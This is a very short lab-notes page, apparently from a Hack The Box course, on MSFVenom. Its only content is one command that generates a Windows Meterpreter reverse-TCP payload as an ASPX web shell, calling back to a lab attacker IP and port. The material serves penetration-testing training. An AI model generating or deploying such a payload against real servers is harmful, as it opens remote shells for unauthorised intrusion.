---
title: "MSFVenom"
description: "Payload generation, encoding, and real-world deployment workflows."
---
...
```shellsession
Dudji@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
